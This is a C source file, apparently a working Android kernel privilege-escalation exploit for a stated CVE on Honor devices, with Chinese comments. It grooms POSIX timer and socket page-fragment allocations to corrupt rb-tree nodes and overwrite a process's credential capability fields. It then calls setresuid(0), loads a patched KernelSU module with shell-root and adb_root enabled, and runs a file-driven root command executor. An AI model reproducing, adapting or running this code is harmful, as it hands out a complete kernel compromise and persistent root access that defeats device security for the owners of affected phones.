/*
 * Upstream attribution:
 * Derived from src/posix64560/t64560_v42.c in CVE-2026-64560-public at
 * commit 63b4f2b7b497d835c7cb1a43ff8851cd0d7a9ac8.
 * Copyright (c) 2026 GhostLock/CVE-2026-64560 research contributors.
 * Licensed under the MIT License; see
 * LICENSES/MIT-CVE-2026-64560.txt.
 * Honor-specific modifications Copyright (c) 2026 superboyyy.
 *
 * t64560_v34.c —— 从「零写」升级到「把 cred 的 cap_effective 变成可用的能力集」
 *
 * 背景（SELinux 已被 v33 关掉 → tracefs 的 enable 可用 → kprobe 可用）：
 *   `__set_task_comm` 探针能直接给出任意进程的 task/real_cred/cred（未哈希），
 *   于是我们第一次能"指名"地改写某个活进程的 cred 字段。
 *
 * 本文件做两阶段：
 *   阶段 1（已验证过的零写链）：把 0 写进 <cred>+0x48 = cap_bset。
 *       链：伪造节点 __rb_parent_color=0、rb_right=0、rb_left=T
 *           → __rb_erase_augmented 走 "!child" 分支 → *(T)=0
 *           → rb_next 返回 NULL ⇒ cleanup_timers 立刻收尾，不碰第二次。
 *        同时 timerqueue_del 末尾的 RB_CLEAR_NODE 把「节点自身地址」写回节点首 8 字节，
 *        而节点就在我们的 frag 页上 ⇒ recv(MSG_PEEK) 读回即得页内真实地址 P。
 *        这一页用 MSG_PEEK 保活，后面阶段 2 要把它当作「parent 假节点」。
 *
 *   阶段 2（指针值写）：伪造节点 __rb_parent_color=P、rb_left=0、rb_right=T
 *       其中 T = <cred>+0x40 = cap_effective。
 *         rb_next(A) : rb_right=T ⇒ 读 *(T+16)=cap_ambient=0 ⇒ 返回 T，head->next=T
 *         rb_erase(A): !tmp 分支 ⇒ *(T)=P（cap_effective 先变成 P）
 *                     __rb_change_child(A, T, P) ⇒ P->rb_right = T（页内，无害）
 *         迭代 2（node=T）: rb_next(T) 读 *(T+8)=cap_bset=0（阶段1已清零）
 *                     ⇒ rb_parent(T)=P，T==P->rb_right ⇒ 继续上走到 P，parent(P)=1&~3=0 ⇒ NULL
 *                     rb_erase(T): child=*(T+8)=0, tmp=*(T+16)=0 ⇒ 只清 P->rb_right
 *                     RB_CLEAR_NODE(T) ⇒ *(T) = T（最终 cap_effective = cred+0x40）
 *         循环在 head->next=NULL 处结束，不再有第三次迭代。
 *       ⇒ 只要 (cred+0x40) 的 bit16（CAP_SYS_MODULE）为 1，该进程就能 init_module。
 *
 * 用法:
 *   t64560_v34 --cand <name>                     # 候选进程：改 comm 后轮询自己的 CapEff
 *   t64560_v34 <cred> <att1> <att2> <timers> <victims> <nfrag> <drain_ms>
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define CPUCLOCK_SCHED 2
#define MAXCPU 8
#define MAXVICTIM 24
#define MAXFRAG 12000

#define ITIMER_NODE_OFF 0x0e0UL
#define SLOT_STRIDE     0x180UL
#define PAGE_FRAG_SZ    8192UL
#define FILL_BYTE       0x41
#define DRAIN_SLACK     320

#define CRED_CAP_BSET      0x48UL
#define CRED_CAP_EFFECTIVE 0x40UL

struct cap_hdr { unsigned int version; int pid; };
struct cap_data { unsigned int effective, permitted, inheritable; };

static volatile int *g_go_all;
static volatile int *g_del;

static int g_ring[MAXFRAG];
static int g_ring_n, g_ring_head, g_ring_cap;
static int g_self;               /* --self：目标就是本进程自己的 cred */

static long long now_ms(void)
{
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);
    return (long long)t.tv_sec * 1000 + t.tv_nsec / 1000000;
}

static void pin_cpu(int c)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(c % MAXCPU, &s);
    sched_setaffinity(0, sizeof s, &s);
}

/* ------------------------------------------------------------------ *
 * 提速开关（环境变量，默认值即“提速”档），与 t64560_v36 保持一致：
 *   T64560_PCP=1      deleter 与 spray 同核，靠 pcp 原地回收，不等排空。
 *   T64560_FLOOR_MS=  每轮最早开始喷洒的时间（默认 600ms）。
 *   T64560_WAVE_MS=   分波喷洒间隔（默认 200ms，0 = 不分波）。
 *   T64560_POLL_MS=   排空轮询间隔（默认 20ms）。
 * ------------------------------------------------------------------ */
static int g_pcp;

static int read_posix_slab(int *active, int *total);

/* 可选调参文件：一行一个 KEY=VALUE，只在环境变量没设时生效。 */
static void load_cfg(const char *path)
{
    FILE *f = fopen(path, "re");
    char line[160];

    if (!f)
        return;
    while (fgets(line, sizeof line, f)) {
        char *eq = strchr(line, '=');
        if (!eq)
            continue;
        *eq = 0;
        char *k = line;
        char *v = eq + 1;
        while (*k == ' ' || *k == '\t') k++;
        char *ke = k + strlen(k);
        while (ke > k && (ke[-1] == ' ' || ke[-1] == '\t')) *--ke = 0;
        char *ve = v + strlen(v);
        while (ve > v && (ve[-1] == '\n' || ve[-1] == '\r' || ve[-1] == ' ')) *--ve = 0;
        if (*k && getenv(k) == NULL)
            setenv(k, v, 1);
    }
    fclose(f);
}


static const char *honor_work_dir(void)
{
    const char *dir = getenv("HONOR_WORK");
    return dir && *dir ? dir : "/data/local/tmp/honor";
}

static void honor_work_path(char *out, size_t size, const char *name)
{
    snprintf(out, size, "%s/%s", honor_work_dir(), name);
}

static int env_ms(const char *name, int fallback)
{
    const char *s = getenv(name);

    if (!s || !*s)
        return fallback;
    int v = atoi(s);
    return v < 0 ? fallback : v;
}

/* 等 posix_timers_cache 回到 want 水平。返回耗时（ms）；超时返回 -1。 */
static long long settle_slab(int want_a, int want_t, int max_ms)
{
    long long t0 = now_ms();
    int act, tot;

    for (;;) {
        if (read_posix_slab(&act, &tot) == 0 &&
            (want_a <= 0 || (act <= want_a + DRAIN_SLACK &&
                             tot <= want_t + DRAIN_SLACK)))
            return now_ms() - t0;
        if (now_ms() - t0 >= max_ms)
            return -1;
        usleep(50000);
    }
}

static int read_posix_slab(int *active, int *total)
{
    FILE *f = fopen("/proc/slabinfo", "re");
    char line[256];

    if (!f) return -1;
    while (fgets(line, sizeof line, f)) {
        if (sscanf(line, "posix_timers_cache %d %d", active, total) == 2) {
            fclose(f);
            return 0;
        }
    }
    fclose(f);
    return -1;
}

/* parent = __rb_parent_color；right = rb_right；left = rb_left
 * 页偏移 0 额外放一个"干净的父节点"：
 *   +0x00 = 1  (parent=NULL 且颜色=BLACK；也当作假 cred 的 usage)
 *   +0x08 = 0  (rb_right)
 *   +0x10 = 0  (rb_left)
 */
static void build_fragment(unsigned char *p, size_t len, unsigned long long parent,
                           unsigned long long left, unsigned long long right)
{
    memset(p, FILL_BYTE, len);
    *(unsigned long long *)(p + 0x00) = 1;
    *(unsigned long long *)(p + 0x08) = 0;
    *(unsigned long long *)(p + 0x10) = 0;

    for (unsigned long slot = 0; slot + SLOT_STRIDE <= len; slot += SLOT_STRIDE) {
        unsigned long base = slot + ITIMER_NODE_OFF;
        if (base + 0x40 > len) break;
        *(unsigned long long *)(p + base + 0x00) = parent;
        *(unsigned long long *)(p + base + 0x08) = right;
        *(unsigned long long *)(p + base + 0x10) = left;
        *(unsigned long long *)(p + base + 0x18) = 0;
        *(unsigned long long *)(p + base + 0x20) = 0;
        *(unsigned long long *)(p + base + 0x28) = 0;
    }
}

static int frag_spray(int n, const unsigned char *buf)
{
    int ok = 0;

    for (int i = 0; i < n; i++) {
        int sv[2];

        if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, sv) != 0) break;
        if (send(sv[0], buf, PAGE_FRAG_SZ, MSG_NOSIGNAL) != (ssize_t)PAGE_FRAG_SZ) {
            close(sv[0]); close(sv[1]);
            break;
        }
        close(sv[0]);
        if (g_ring_n == g_ring_cap) {
            close(g_ring[g_ring_head]);
            g_ring[g_ring_head] = sv[1];
            g_ring_head = (g_ring_head + 1) % g_ring_cap;
        } else {
            g_ring[(g_ring_head + g_ring_n) % g_ring_cap] = sv[1];
            g_ring_n++;
        }
        ok++;
    }
    return ok;
}

static void frag_trim_all(void)
{
    for (int i = 0; i < g_ring_n; i++)
        if (g_ring[i] >= 0) close(g_ring[i]);
    g_ring_n = 0;
    g_ring_head = 0;
}

static int make_timer(clockid_t cid)
{
    struct sigevent ev;
    struct itimerspec its;
    int id = -1;

    memset(&ev, 0, sizeof ev);
    ev.sigev_notify = SIGEV_SIGNAL;
    ev.sigev_signo = SIGUSR1;
    if (syscall(SYS_timer_create, cid, &ev, &id) != 0) return -1;
    memset(&its, 0, sizeof its);
    its.it_value.tv_sec = 3600;              /* 远期：节点常驻队列 */
    if (syscall(SYS_timer_settime, id, 0, &its, NULL) != 0) {
        syscall(SYS_timer_delete, id);
        return -1;
    }
    return id;
}

struct deljob { int widx, wcount, n, victim, *ids; };

static void *delete_worker(void *arg)
{
    struct deljob *j = arg;

    pin_cpu(g_pcp ? 0 : 2 + j->widx);
    while (!g_go_all[j->victim]) ;
    for (int i = j->widx; i < j->n; i += j->wcount)
        if (syscall(SYS_timer_delete, j->ids[i]) == 0)
            __sync_fetch_and_add((int *)&g_del[j->victim], 1);
    return NULL;
}

struct execjob { volatile int *del; int exec_after; int slot; };

static void *victim_exec_thread(void *u)
{
    struct execjob *j = u;
    char slot[8];
    char *argv[] = { (char *)"/proc/self/exe", (char *)"--victim-child", slot, NULL };

    snprintf(slot, sizeof slot, "%d", j->slot);
    pin_cpu(1);
    while (!g_go_all[j->slot]) ;
    while (*j->del < j->exec_after) ;
    execv(argv[0], argv);
    _exit(111);
}

static int cap_has_sys_module(void)
{
    struct cap_hdr h;
    struct cap_data d[2];

    h.version = 0x20080522;   /* _LINUX_CAPABILITY_VERSION_3 */
    h.pid = 0;
    if (syscall(SYS_capget, &h, d) != 0) return 0;
    return (d[0].effective & (1u << 16)) != 0;   /* CAP_SYS_MODULE */
}

/* 从 /proc/self/status 里取某个 Cap* 字段（用于自持模式自检：写到底有没有打到
 * 本进程的 cred 上 —— CapBnd 对应 cred->cap_bset，CapEff 对应 cred->cap_effective） */
static unsigned long long read_cap_field(const char *name)
{
    FILE *f = fopen("/proc/self/status", "r");
    char line[256];
    unsigned long long v = 0;
    size_t n = strlen(name);

    if (!f) return 0;
    while (fgets(line, sizeof line, f)) {
        if (!strncmp(line, name, n) && line[n] == ':') {
            v = strtoull(line + n + 1, NULL, 16);
            break;
        }
    }
    fclose(f);
    return v;
}

static void write_file(const char *path, const char *fmt, ...)
{
    char buf[512];
    va_list ap;
    int n;

    va_start(ap, fmt);
    n = vsnprintf(buf, sizeof buf, fmt, ap);
    va_end(ap);
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (fd >= 0) { if (n > 0) { ssize_t r = write(fd, buf, (size_t)n); (void)r; } close(fd); }
}

static void append_file(const char *path, const char *fmt, ...)
{
    char buf[512];
    va_list ap;
    int n;

    va_start(ap, fmt);
    n = vsnprintf(buf, sizeof buf, fmt, ap);
    va_end(ap);
    int fd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0666);
    if (fd >= 0) { if (n > 0) { ssize_t r = write(fd, buf, (size_t)n); (void)r; } close(fd); }
}

static unsigned long long read_capeff(void)
{
    FILE *f = fopen("/proc/self/status", "re");
    char line[256];
    unsigned long long v = 0;

    if (!f) return 0;
    while (fgets(line, sizeof line, f)) {
        if (sscanf(line, "CapEff: %llx", &v) == 1) break;
    }
    fclose(f);
    return v;
}

/* 先把 kernelsu 卸掉，再带 allow_shell=1 重新加载 —— 这样普通 shell(uid 2000) 调 su 也能拿到 root。
 * delete_module/finit_module 都需要 CAP_SYS_MODULE，只有本候选进程有。 */
static void reload_ksu_with_allow_shell(void)
{
    errno = 0;
    long dr = syscall(SYS_delete_module, "kernelsu", 1 /* O_NONBLOCK */);
    int de = errno;
    int fd = open("/data/local/tmp/ksu-patched.ko", O_RDONLY);
    if (fd < 0) {
        append_file("/data/local/tmp/KSU_RESULT", "reload: open ko errno=%d\n", errno);
        return;
    }
    errno = 0;
    /* force_feature 的格式是「名字:数值」，多个用逗号分隔（反汇编
     * force_feature_param_set 确认：按 ',' 切分、再按 ':' 分名与值、值走 kstrtoull 十进制）。
     * adb_root 是 KSU 内置 feature：强制开启后 adbd 重启不会降权，比写 ro.debuggable 干净。 */
    long rc = syscall(SYS_finit_module, fd, "allow_shell=1 force_feature=adb_root:1", 0);
    append_file("/data/local/tmp/KSU_RESULT",
                "reload: delete_module rc=%ld errno=%d(%s) ; finit_module(allow_shell=1,force_feature=adb_root:1) rc=%ld errno=%d(%s)\n",
                dr, de, strerror(de), rc, errno, strerror(errno));
    close(fd);
}

static void try_load(const char *ko)
{
    int fd = open(ko, O_RDONLY);
    if (fd < 0) { append_file("/data/local/tmp/KSU_RESULT", "open %s: errno=%d\n", ko, errno); return; }
    errno = 0;
    long rc = syscall(SYS_finit_module, fd, "", 0);
    int e = errno;
    append_file("/data/local/tmp/KSU_RESULT", "finit_module %s: rc=%ld errno=%d(%s)\n",
                ko, rc, e, strerror(e));
    close(fd);
}

static void run_script(const char *path)
{
    pid_t p = fork();
    if (p == 0) {
        int out = open("/data/local/tmp/rsh.out", O_WRONLY | O_CREAT | O_APPEND, 0666);
        if (out >= 0) { dup2(out, 1); dup2(out, 2); }
        execl("/system/bin/sh", "sh", path, (char *)NULL);
        _exit(127);
    }
    if (p > 0) waitpid(p, NULL, 0);
}

static int candidate_main(const char *name)
{
    char buf[32];

    snprintf(buf, sizeof buf, "%s", name);
    prctl(PR_SET_NAME, buf, 0, 0, 0);
    {
        char pf[64];
        snprintf(pf, sizeof pf, "/data/local/tmp/cand_%s.pid", buf);
        int f = open(pf, O_WRONLY | O_CREAT | O_TRUNC, 0666);
        if (f >= 0) { dprintf(f, "%d\n", (int)getpid()); close(f); }
    }

    for (;;) {
        if (!cap_has_sys_module()) { usleep(100000); continue; }

        static int announced;
        if (!announced) {
            announced = 1;
            unsigned long long cap = read_capeff();
            int rg = setresgid(0, 0, 0);
            int ru = setresuid(0, 0, 0);
            write_file("/data/local/tmp/ROOTED",
                       "pid=%d comm=%s CapEff=%#llx setresgid=%d setresuid=%d uid=%d euid=%d\n",
                       (int)getpid(), buf, cap, rg, ru, (int)getuid(), (int)geteuid());
            /* 一拿到能力就把 KernelSU 带 allow_shell=1 装上/重装。
             * 但若存在 /data/local/tmp/NOLOAD，则先不加载 —— 便于在加载前
             * chmod 644 /data/system/packages.list，让内核 track_throne() 能读到
             * 包列表、把管理器「加冕」（否则管理器会一直显示未安装/无越狱模式）。 */
            if (access("/data/local/tmp/NOLOAD", F_OK) != 0)
                reload_ksu_with_allow_shell();
        }

        if (access("/data/local/tmp/DOLOAD", F_OK) == 0) {
            unlink("/data/local/tmp/DOLOAD");
            append_file("/data/local/tmp/KSU_RESULT", "=== CapEff=%#llx uid=%d\n",
                        read_capeff(), (int)geteuid());
            reload_ksu_with_allow_shell();
        }

        /* 根命令执行器：把 /data/local/tmp/CMD 当脚本跑（父进程保持能力，不 exec） */
        if (access("/data/local/tmp/CMD", F_OK) == 0) {
            rename("/data/local/tmp/CMD", "/data/local/tmp/CMD.run");
            append_file("/data/local/tmp/rsh.out", "=== run as uid=%d CapEff=%#llx\n",
                        (int)geteuid(), read_capeff());
            run_script("/data/local/tmp/CMD.run");
            unlink("/data/local/tmp/CMD.run");
            append_file("/data/local/tmp/rsh.out", "=== done\n");
        }
        usleep(150000);
    }
    return 0;
}

int main(int argc, char **argv)
{
    if (argc > 1 && !strcmp(argv[1], "--victim-child")) {
        signal(SIGUSR1, SIG_IGN);
        for (;;) pause();
    }
    if (argc > 2 && !strcmp(argv[1], "--cand"))
        return candidate_main(argv[2]);

    /* 自持模式：把「执行漏洞的进程」自己当成 cred 目标。
     * 流程：改 comm（让宿主从 kprobe trace 里读到本进程的 cred）→ 等宿主把地址
     * 写进 /data/local/tmp/self.cred → 两阶段写 → 落地后直接进入 candidate_main
     * （它会写 ROOTED 并执行 CMD）。
     * 这样就没有「目标进程被 lmkd 杀掉」或「trace 里的地址已过期」这两类失败 ——
     * 因为目标就是正在跑的这个进程，落地那一刻它必定还活着。 */
    if (argc > 3 && !strcmp(argv[1], "--self")) {
        static char selfcred[32];
        prctl(PR_SET_NAME, "PTGT", 0, 0, 0);
        int rf = open("/data/local/tmp/self.ready", O_WRONLY | O_CREAT | O_TRUNC, 0666);
        if (rf >= 0) close(rf);
        for (int i = 0; i < 900 && !selfcred[0]; i++) {
            int g = open("/data/local/tmp/self.cred", O_RDONLY);
            if (g >= 0) {
                int n = read(g, selfcred, sizeof selfcred - 1);
                close(g);
                if (n > 0) { selfcred[n] = 0; break; }
            }
            usleep(100000);
        }
        if (!selfcred[0]) { fprintf(stderr, "self: no cred file\n"); return 3; }
        printf("self: cred=%s\n", selfcred);
        fflush(stdout);
        argv[1] = selfcred;      /* 参数位对齐成 <cred> <att1> <att2> ... */
        g_self = 1;
    }

    if (argc < 8) {
        fprintf(stderr, "usage: %s <cred> <att1> <att2> <timers> <victims> <nfrag> <drain_ms>\n", argv[0]);
        return 2;
    }

    unsigned long long cred    = strtoull(argv[1], NULL, 0);
    int att1   = atoi(argv[2]);
    int att2   = atoi(argv[3]);
    int ntimer = atoi(argv[4]);
    int nv     = atoi(argv[5]);
    int nfrag  = atoi(argv[6]);
    int drain_ms = atoi(argv[7]);
    /* 最短排空：基线被上一轮污染时，严格门会瞬间满足（drained=1(103ms)），
     * frag 会在 victim 计时器页回到 buddy 之前就喷出去 ⇒ 必然零命中。 */
    int min_drain = argc > 8 ? atoi(argv[8]) : 4500;
    int nworker = 4;

    if (nv > MAXVICTIM) nv = MAXVICTIM;
    if (nfrag > MAXFRAG) nfrag = MAXFRAG;

    unsigned long long t_bset = cred + CRED_CAP_BSET;
    unsigned long long t_eff  = cred + CRED_CAP_EFFECTIVE;

    printf("v34 cred=%#llx t_bset=%#llx t_eff=%#llx\n", cred, t_bset, t_eff);
    printf("     bit16(cred+0x40)=%d  (1 => CAP_SYS_MODULE 可拿到)\n",
           (int)((t_eff >> 16) & 1));
    fflush(stdout);

    signal(SIGUSR1, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
    pin_cpu(0);

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0 && rl.rlim_cur < rl.rlim_max) {
        rl.rlim_cur = rl.rlim_max;
        setrlimit(RLIMIT_NOFILE, &rl);
    }
    /* 每个持有页的 socket 占一个 fd：把 nfrag 夹进 fd 上限。 */
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0 && rl.rlim_cur > 128) {
        long fd_cap = (long)rl.rlim_cur - 64;
        if (nfrag > fd_cap)
            nfrag = (int)fd_cap;
        if (nfrag < 256)
            nfrag = 256;
    }
    g_ring_cap = nfrag + 512;

    char *shm = mmap(NULL, 8192, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (shm == MAP_FAILED) return 1;
    g_go_all = (volatile int *)(shm + 0);
    g_del    = (volatile int *)(shm + 256);

    unsigned char *fbuf = malloc(PAGE_FRAG_SZ);
    if (!fbuf) return 1;

    int base_a = -1, base_t = -1;
    char cfg_path[512];
    honor_work_path(cfg_path, sizeof(cfg_path), "speed.cfg");
    load_cfg(cfg_path);
    load_cfg("/data/local/tmp/speed.cfg");
    int base_ok = read_posix_slab(&base_a, &base_t) == 0;

    g_pcp = env_ms("T64560_PCP", 0) > 0;
    int floor_ms = env_ms("T64560_FLOOR_MS", 600);
    int wave_ms  = env_ms("T64560_WAVE_MS", 200);
    int poll_ms  = env_ms("T64560_POLL_MS", 20);
    if (poll_ms < 1) poll_ms = 1;
    int batch = nfrag / 8;
    if (batch < 200) batch = 200;
    printf("v34 speed: floor=%dms wave=%dms batch=%d pcp=%d baseline=%d/%d slabinfo=%s\n",
           floor_ms, wave_ms, batch, g_pcp, base_a, base_t,
           base_ok ? "yes" : "no");
    fflush(stdout);

    unsigned long long page = 0;     /* 阶段 1 泄漏到的 frag 页基址 */
    int keep_fd = -1;                /* 保活该页的 socket */

    /* ---------------- 阶段 1：把 0 写进 cred->cap_bset，并泄漏一个 frag 页地址 ------- */
    for (int phase = 1; phase <= 2; phase++) {
        int attempts = (phase == 1) ? att1 : att2;

        /* The APK's reference implementation passes 90/90. Honor has a lower
         * observed landing rate, so retain the caller's phase shape but give
         * each phase enough attempts to match the interactive workflow. */
        int min_attempts = env_ms("T64560_MIN_ATTEMPTS", 260);
        if (attempts < min_attempts)
            attempts = min_attempts;

        if (phase == 1) build_fragment(fbuf, PAGE_FRAG_SZ, 0, t_bset, 0);
        else            build_fragment(fbuf, PAGE_FRAG_SZ, page, 0, t_eff);

        printf("== phase%d start: parent=%#llx left=%#llx right=%#llx attempts=%d\n",
               phase,
               (unsigned long long)(phase == 1 ? 0 : page),
               (unsigned long long)(phase == 1 ? t_bset : 0),
               (unsigned long long)(phase == 1 ? 0 : t_eff), attempts);
        fflush(stdout);

        int landed = 0;

        for (int a = 1; a <= attempts && !landed; a++) {
            pid_t vpid[MAXVICTIM];
            int *ids[MAXVICTIM];
            int total_all = 0;
            long long at0 = now_ms();

            /* 刷新本轮干净基线：上一轮残留必须先回到空闲水平。 */
            long long settle_ms = base_ok ? settle_slab(base_a, base_t, drain_ms) : 0;
            if (settle_ms >= 0) {
                int na = -1, nt = -1;
                if (read_posix_slab(&na, &nt) == 0) {
                    base_a = na;
                    base_t = nt;
                }
            }
            int floor_eff = (!base_ok || settle_ms >= 0) ? floor_ms : min_drain;

            for (int i = 0; i < MAXVICTIM; i++) { vpid[i] = -1; ids[i] = NULL; }
            for (int j = 0; j < nv; j++) { g_go_all[j] = 0; g_del[j] = 0; }

            for (int j = 0; j < nv; j++) {
                pid_t v = fork();
                if (v == 0) {
                    struct execjob ej = { &g_del[j], ntimer / 10, j };
                    pthread_t th;
                    pin_cpu(1);
                    signal(SIGUSR1, SIG_IGN);
                    if (pthread_create(&th, NULL, victim_exec_thread, &ej) != 0) _exit(120);
                    for (;;) pause();
                }
                if (v < 0) break;
                vpid[j] = v;

                clockid_t cid = (clockid_t)(((~(unsigned int)v) << 3) | CPUCLOCK_SCHED);
                ids[j] = calloc((size_t)ntimer, sizeof(int));
                int n = 0;
                for (; n < ntimer; n++) {
                    int id = make_timer(cid);
                    if (id < 0) break;
                    ids[j][n] = id;
                }
                total_all += n;

                pthread_t th[4];
                struct deljob jobs[4];
                for (int i = 0; i < nworker; i++) {
                    jobs[i].widx = i; jobs[i].wcount = nworker;
                    jobs[i].n = n; jobs[i].ids = ids[j]; jobs[i].victim = j;
                    pthread_create(&th[i], NULL, delete_worker, &jobs[i]);
                }
                g_go_all[j] = 1;
                for (int i = 0; i < nworker; i++) pthread_join(th[i], NULL);
            }

            /* 排空 + 分波喷洒：slabinfo 读不到时也能靠“后一批接住刚回到
             * buddy 的计时器页”命中，不再白等满 drain_ms。 */
            long long t0 = now_ms();
            int drained = 0, act = -1, tot = -1, loose = 0;
            int waves = 0, got = 0, stall = 0;
            int ring_before = g_ring_n;

            for (;;) {
                long long el = now_ms() - t0;
                if (el >= drain_ms || got >= nfrag || stall >= 2) break;
                if (base_ok && read_posix_slab(&act, &tot) == 0) {
                    int strict_ok = act <= base_a + DRAIN_SLACK &&
                                    tot <= base_t + DRAIN_SLACK && el >= floor_eff;
                    int loose_ok  = act > 0 && act < 1200 && tot < 1200;
                    if (strict_ok) { drained = 1; break; }
                    if (loose_ok) loose = 1;
                    if (loose && el >= 8000) { drained = 2; break; }
                }
                if (wave_ms > 0 && el >= floor_eff + (long long)waves * wave_ms &&
                    got + batch <= nfrag) {
                    int added = frag_spray(batch, fbuf);
                    if (added <= 0) stall++;
                    else stall = 0;
                    got += added;
                    waves++;
                }
                usleep((useconds_t)poll_ms * 1000);
            }
            long long drained_ms = now_ms() - t0;
            if (got < nfrag)
                got += frag_spray(nfrag - got, fbuf);

            for (int j = 0; j < nv; j++)
                if (vpid[j] > 0) kill(vpid[j], SIGKILL);
            usleep(20000);
            for (int j = 0; j < nv; j++) free(ids[j]);

            /* 用 MSG_PEEK 回读，命中即保活那一页（不要消费掉） */
            int leaks = 0;
            for (int i = ring_before; i < g_ring_n && !landed; i++) {
                unsigned char back[PAGE_FRAG_SZ];
                ssize_t n = recv(g_ring[i], back, sizeof back, MSG_PEEK | MSG_DONTWAIT);
                if (n != (ssize_t)sizeof back) continue;
                for (size_t off = 0; off + 8 <= sizeof back; off += 8) {
                    unsigned long long v;
                    if (memcmp(back + off, fbuf + off, 8) == 0) continue;
                    memcpy(&v, back + off, 8);
                    if (v < 0xffffff8000000000ULL) continue;      /* 只要内核指针 */
                    /* 收紧判据：RB_CLEAR_NODE 写回的是「节点自身地址」，而节点位于
                     * page_base + (slot*0x180 + 0xe0)，page_base 是 8KB 对齐。
                     * 所以要求 (v & 0x1fff) == off，且 off 落在某个槽位的 +0xe0。
                     * 这一条能把"别的子系统改了同一页"的误判挡掉。 */
                    if ((v & 0x1fffULL) != (unsigned long long)off) continue;
                    if ((off % 0x180UL) != 0xe0UL) continue;
                    printf("  LEAK p%d attempt=%d off=%#zx val=%#llx\n",
                           phase, a, off, v);
                    if (phase == 1) {
                        page = v & ~0x1fffULL;
                        keep_fd = g_ring[i];
                        g_ring[i] = -1;          /* 从环里摘出，trim 不关它 */
                        printf("  PAGE=%#llx (kept fd)\n", page);
                    }
                    landed = 1;
                    leaks++;
                    break;
                }
            }

            frag_trim_all();

            printf("  p%d attempt=%d timers=%d settle=%lld drained=%d(%lldms) "
                   "slab=%d/%d frag=%d waves=%d leak=%d elapsed=%lldms\n",
                   phase, a, total_all, settle_ms, drained, drained_ms,
                   act, tot, got, waves, leaks, now_ms() - at0);
            fflush(stdout);
        }

        if (!landed) {
            printf("phase%d: no landing in %d attempts, abort\n", phase, attempts);
            return 3;
        }
        if (phase == 1 && page == 0) {
            printf("phase1 landed but no page captured, abort\n");
            return 4;
        }
    }

    (void)keep_fd;
    if (g_self) {
        /* 自检：p1 写的是 cap_bset（= CapBnd），p2 写的是 cap_effective（= CapEff）。
         * 若 CapBnd 仍是原值，说明写的地址不是本进程当前的 cred（地址失效）。 */
        printf("self check: pid=%d cred=%#llx CapBnd=%#llx CapEff=%#llx\n",
               (int)getpid(), cred,
               read_cap_field("CapBnd"), read_cap_field("CapEff"));
        fflush(stdout);
    }
    printf("phase2 landed: cred=%#llx cap_effective should now be %#llx\n", cred, t_eff);
    printf("check candidate: cat /data/local/tmp/ROOTED\n");
    fflush(stdout);
    if (!g_self) {
        char phase2_path[512];
        honor_work_path(phase2_path, sizeof(phase2_path), "PHASE2_DONE");
        int marker = open(phase2_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (marker >= 0)
            close(marker);
        printf("PHASE2_DONE\n");
        fflush(stdout);
        return 0;
    }
    if (g_self) {
        printf("self: entering candidate loop pid=%d uid=%d\n", (int)getpid(), (int)getuid());
        fflush(stdout);
        return candidate_main("PTGT");   /* 不返回 */
    }
    char module_path[512];
    honor_work_path(module_path, sizeof(module_path), "ksu-patched.ko");
    printf("MODULE_LOAD pending path=%s\n", module_path);
    fflush(stdout);
    int module_fd = open(module_path, O_RDONLY);
    errno = 0;
    long module_result =
        module_fd < 0
            ? -1
            : syscall(SYS_finit_module, module_fd, "allow_shell=1", 0);
    int module_errno = errno;
    if (module_fd >= 0)
        close(module_fd);
    printf("FINTI_MODULE rc=%ld errno=%d(%s)\n", module_result,
           module_errno, strerror(module_errno));
    if (module_result == 0)
        printf("MODULE_LOADED\n");
    fflush(stdout);
    for (;;) pause();
    return 0;
}
